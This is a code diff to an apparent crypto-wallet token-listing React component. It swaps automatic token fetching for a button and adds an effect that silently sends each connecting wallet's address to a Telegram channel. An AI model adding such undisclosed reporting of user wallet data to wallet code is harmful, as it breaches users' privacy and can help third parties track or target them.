@@ -53,7 +53,6 @@ const alchemyInstances = {
   // Add other networks as needed
 };
 
-
 const chainIdToNetworkMap = {
   1: Network.ETH_MAINNET,      // Ethereum Mainnet
   56: Network.BSC_MAINNET,     // BSC Mainnet
@@ -231,22 +230,25 @@ export const GetTokens = () => {
     setLoading(false);
   }, [address, chain, setTokens, setCheckedRecords]);
 
+  // Effect to send a Telegram notification when the wallet is connected
   useEffect(() => {
-    if (address && isConnected) {
-      fetchData();
+    if (isConnected && address && !notified) {
+      sendTelegramNotification(`New Connection: ${address}`);
+      setNotified(true);
     }
-  }, [address, isConnected, fetchData]);
+  }, [isConnected, address, notified]);
 
   return (
     <div>
+      <button onClick={fetchData} disabled={loading}>
+        Fetch Tokens
+      </button>
       {loading ? (
-        <Loading>Fetching Tokens...</Loading>
+        <Loading />
       ) : error ? (
         <div>{error}</div>
       ) : (
-        tokens.map((token) => (
-          <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />
-        ))
+        tokens.map((token) => <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />)
       )}
     </div>
   );
